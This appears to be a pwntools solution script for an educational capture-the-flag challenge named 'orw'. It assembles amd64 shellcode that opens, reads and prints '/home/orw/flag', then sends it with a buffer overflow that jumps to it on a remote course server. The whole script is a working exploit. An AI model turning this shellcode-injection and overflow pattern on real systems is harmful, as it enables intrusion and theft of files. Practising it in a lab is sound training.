from pwn import *

arch = context.update(arch='amd64', os='linux')
p = process("./orw")

payload = """
mov rax, 0x67616c662f77
push rax
mov rax, 0x726f2f656d6f682f
push rax
mov rdi, rsp
mov rax, 2
xor rdx, rdx
xor rsi, rsi
syscall 

mov rdi, rax
mov rdx, 0x100
mov rsi, rsp
mov rax, 0
syscall

mov rsi, rsp
mov rdx, 0x100
mov rdi, 1
mov rax, 1
syscall
"""
#p.recv()
#p.send(asm(payload))
#p.recv()
#gdb.attach(p)
#p.sendline(b"a"*0x18+p64(0x6010a0))

#p.interactive()

r = remote("edu-ctf.csie.org", 10171)
a = r.recvline()
r.send(asm(payload))
r.recv()
r.send(b'a'*0x18+p64(0x6010a0))

r.interactive()
